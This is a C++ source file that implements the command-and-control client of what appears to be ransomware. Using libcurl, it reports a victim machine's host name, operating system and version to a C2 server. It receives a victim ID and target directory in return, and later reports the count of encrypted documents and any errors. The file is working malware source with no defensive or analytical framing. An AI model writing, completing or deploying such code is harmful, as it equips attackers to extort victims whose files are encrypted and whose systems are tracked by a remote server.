#include "C2CCommunication.h"
#include <iostream>
#include <iomanip>

static const std::string C2ACTIONSTART = "start";
static const std::string C2ACTIONEND = "end";
static const std::string C2ACTIONERROR = "error";

C2CCommunication::C2CCommunication(const std::string &url) : url_(url)
{
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl_ = curl_easy_init();
}

C2CCommunication::~C2CCommunication()
{
    if (curl_)
    {
        curl_easy_cleanup(curl_);
    }
    curl_global_cleanup();
}

std::map<std::string, std::string> C2CCommunication::sendStart()
{
    if (!curl_)
    {
        return {};
    }

    std::map<std::string, std::string> queryParams = getSystemInfo();
    queryParams["action"] = C2ACTIONSTART;

    std::string queryString = mapToQueryString(queryParams);
    std::string fullUrl = url_ + "?" + queryString;

    std::string response;

    curl_easy_setopt(curl_, CURLOPT_URL, fullUrl.c_str());
    curl_easy_setopt(curl_, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl_, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl_, CURLOPT_WRITEDATA, &response);
    CURLcode res = curl_easy_perform(curl_);

    if (res != CURLE_OK)
    {
        return {};
    }

    std::map<std::string, std::string> result;
    std::vector<std::string> spl = split(response, ';');

    result["uuid"] = spl[0];
    result["directory"] = spl[1];

    return result;
}

void C2CCommunication::sendEnd(std::string uuid, int totalFiles)
{
    if (!curl_)
    {
        return;
    }

    std::map<std::string, std::string> queryParams;
    queryParams["action"] = C2ACTIONEND;
    queryParams["id"] = uuid;
    queryParams["tot_docs_encrypted"] = std::to_string(totalFiles);

    std::string queryString = mapToQueryString(queryParams);
    std::string fullUrl = url_ + "?" + queryString;

    std::string response;

    curl_easy_setopt(curl_, CURLOPT_URL, fullUrl.c_str());
    curl_easy_setopt(curl_, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl_, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl_, CURLOPT_WRITEDATA, &response);
    CURLcode res = curl_easy_perform(curl_);

    if (res != CURLE_OK)
    {
        return;
    }
}

void C2CCommunication::sendError(std::string uuid, std::string error)
{
    if (!curl_)
    {
        return;
    }

    std::map<std::string, std::string> queryParams;
    queryParams["action"] = C2ACTIONERROR;
    queryParams["id"] = uuid;
    queryParams["error"] = error;

    std::string queryString = mapToQueryString(queryParams);
    std::string fullUrl = url_ + "?" + queryString;

    std::string response;

    curl_easy_setopt(curl_, CURLOPT_URL, fullUrl.c_str());
    curl_easy_setopt(curl_, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl_, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl_, CURLOPT_WRITEDATA, &response);
    CURLcode res = curl_easy_perform(curl_);
}

std::string C2CCommunication::mapToQueryString(const std::map<std::string, std::string>& params) {
    std::ostringstream oss;
    bool first = true;
    
    for (const auto& pair : params) {
        if (!first) {
            oss << "&";
        }
        first = false;
        oss << urlEncode(pair.first) << "=" << urlEncode(pair.second);
    }
    
    return oss.str();
}

size_t C2CCommunication::WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t totalSize = size * nmemb;
    std::string *response = reinterpret_cast<std::string *>(userp);
    response->append(reinterpret_cast<char *>(contents), totalSize);
    return totalSize;
}

std::map<std::string, std::string> C2CCommunication::getSystemInfo()
{
    std::map<std::string, std::string> systemInfo;
#ifdef _WIN32
    char computerName[256];
    DWORD size = sizeof(computerName);
    if (GetComputerName(computerName, &size))
    {
        systemInfo["host_name"] = std::string(computerName);
    }

    OSVERSIONINFO osvi = {sizeof(OSVERSIONINFO)};
    if (GetVersionEx(&osvi))
    {
        systemInfo["os"] = "Windows";
        systemInfo["os_version"] = std::to_string(osvi.dwMajorVersion) + "." + std::to_string(osvi.dwMinorVersion);
    }
#else
    struct utsname buffer;
    if (uname(&buffer) == 0)
    {
        systemInfo["host_name"] = std::string(buffer.nodename);
        systemInfo["os"] = std::string(buffer.sysname);
        systemInfo["os_version"] = std::string(buffer.release);
    }
#endif
    return systemInfo;
}

std::vector<std::string> C2CCommunication::split(const std::string& s, char delimiter) {
    std::vector<std::string> tokens;
    std::string token;
    std::istringstream tokenStream(s);
    
    while (std::getline(tokenStream, token, delimiter)) {
        tokens.push_back(token);
    }
    
    return tokens;
}

std::string C2CCommunication::urlEncode(const std::string &value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;

    for (char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else {
            escaped << '%' << std::setw(2) << int((unsigned char) c);
        }
    }

    return escaped.str();
}